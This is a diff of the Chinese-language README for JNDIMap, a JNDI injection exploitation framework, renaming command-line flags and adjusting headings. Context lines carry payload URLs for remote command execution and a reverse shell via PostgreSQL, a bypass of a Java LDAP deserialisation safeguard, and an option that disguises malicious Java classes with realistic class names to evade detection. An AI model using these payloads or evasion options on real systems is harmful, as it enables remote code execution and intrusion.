@@ -5,31 +5,34 @@
 ## Usage
 
 ```bash
-Usage: JNDIMap.jar [-hV] [-fakeClassName] [-useReferenceOnly] [-f=<file>]
-                   [-i=<ip>] [-j=<jksPath>] [-k=<jksPin>] [-l=<ldapPort>]
-                   [-p=<httpPort>] [-r=<rmiPort>] [-s=<ldapsPort>] [-u=<url>]
+Usage: JNDIMap.jar [-hV] [--confusing-class-name] [--use-reference-only]
+                   [-f=<file>] [-i=<ip>] [-j=<jks-path>] [-k=<jks-pin>]
+                   [-l=<ldap-port>] [-p=<http-port>] [-r=<rmi-port>]
+                   [-s=<ldaps-port>] [-u=<url>]
 JNDI injection exploitation framework
-  -i, --ip=<ip>             IP address (codebase) to listen on
-                              Default: 127.0.0.1
-  -r, --rmiPort=<rmiPort>   RMI server bind port
-                              Default: 1099
-  -l, --ldapPort=<ldapPort> LDAP server bind port
-                              Default: 1389
-  -s, --ldapsPort=<ldapsPort>
-                            LDAPS server bind port
-                              Default: 1636
-  -p, --httpPort=<httpPort> HTTP server bind port
-                              Default: 3456
-  -u, --url=<url>           specify the JNDI route
-  -j, --jksPath=<jksPath>   path to the JKS cert
-  -k, --jksPin=<jksPin>     pin of the JKS cert
-  -f, --file=<file>         path to the custom JS script
-      -useReferenceOnly     directly returns Reference object through LDAP
-                              related parameters
-      -fakeClassName        use random fake class names when generating
-                              malicious Java classes
-  -h, --help                Show this help message and exit.
-  -V, --version             Print version information and exit.
+  -i, --ip=<ip>              IP address (codebase) to listen on
+                               Default: 127.0.0.1
+  -r, --rmi-port=<rmi-port>  RMI server bind port
+                               Default: 1099
+  -l, --ldap-port=<ldap-port>
+                             LDAP server bind port
+                               Default: 1389
+  -s, --ldaps-port=<ldaps-port>
+                             LDAPS server bind port
+                               Default: 1636
+  -p, --http-port=<http-port>
+                             HTTP server bind port
+                               Default: 3456
+  -u, --url=<url>            specify the JNDI route
+  -j, --jks-path=<jks-path>  path to the JKS cert
+  -k, --jks-pin=<jks-pin>    pin of the JKS cert
+  -f, --file=<file>          path to the custom JS script
+      --use-reference-only   directly returns Reference object through LDAP
+                               related parameters
+      --confusing-class-name use confusing class names when generating
+                               malicious Java classes
+  -h, --help                 Show this help message and exit.
+  -V, --version              Print version information and exit.
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -50,11 +53,13 @@ JNDI injection exploitation framework
 
 `-f`: 自定义 JS 脚本路径, 用于编写自定义 JNDI Payload
 
-`-useReferenceOnly`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`
+`--use-reference-only`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`
 
-`-fakeClassName`: 在生成恶意 Java 类时使用随机虚假类名, 该类名与真实项目高度相似
+`--confusing-class-name`: 在生成恶意 Java 类时使用随机虚假类名, 该类名与真实项目高度相似
 
 `-h`: 显示帮助信息
+
+`-V`: 显示版本信息
 
 ## URL 格式
 
@@ -166,7 +171,7 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 ### XStream
 
-利用 XStream 反序列化实现 RCE
+利用 XStream 反序列化实现 RCE (版本 <= 1.4.15)
 
 反序列化部分使用 UIDefaults + SwingLazyValue 依次触发下列 Gadget:
 
@@ -179,7 +184,7 @@ XSLT Payload 部分使用了 Spring 的反射库调用 defineClass, 因此需要
 # XStream Bypass (依赖 Spring)
 # 基于任意文件写 + XSLT 加载, 因为先后顺序问题有概率失败, 需要多试几次
 ldap://127.0.0.1:1389/XStream/Command/open -a Calculator
-````
+```
 
 ### SnakeYaml
 
@@ -348,7 +353,7 @@ ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
 # 反弹 Shell
 ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
-````
+```
 
 ### H2
 
@@ -590,7 +595,9 @@ java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
 ldap://127.0.0.1:1389/x
 ```
 
-## useReferenceOnly
+## 高级技巧
+
+### Use Reference Only
 
 对于 LDAP 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
 
@@ -622,20 +629,20 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
 }
 ```
 
-使用时指定 `-useReferenceOnly` 参数即可
+使用时指定 `--use-reference-only` 参数即可
 
 ```bash
-java -jar JNDIMap.jar -useReferenceOnly
+java -jar JNDIMap.jar --use-reference-only
 ```
 
-## fakeClassName
+### Confusing Class Name
 
 JNDIMap 的 [classNames](src/main/resources/classNames) 目录中包含了一些与真实项目高度相似的虚假类名, 这些类名基于 [ClassNameObfuscator](https://github.com/X1r0z/ClassNameObfuscator) 项目生成, 可用于 JNDI 注入中生成恶意 Java 类的相关场景
 
-使用时指定 `-fakeClassName` 参数即可
+使用时指定 `--confusing-class-name` 参数即可
 
 ```bash
-java -jar JNDIMap.jar -fakeClassName
+java -jar JNDIMap.jar --confusing-class-name
 ```
 
-当未指定 `-fakeClassName` 参数时, JNDIMap 会生成符合 `[A-Z]{1}[A-Za-z0-9]{7}` 格式的随机字符串作为恶意类的类名
+当未指定 `--confusing-class-name` 参数时, JNDIMap 会生成符合 `[A-Z]{1}[A-Za-z0-9]{7}` 格式的随机字符串作为恶意类的类名
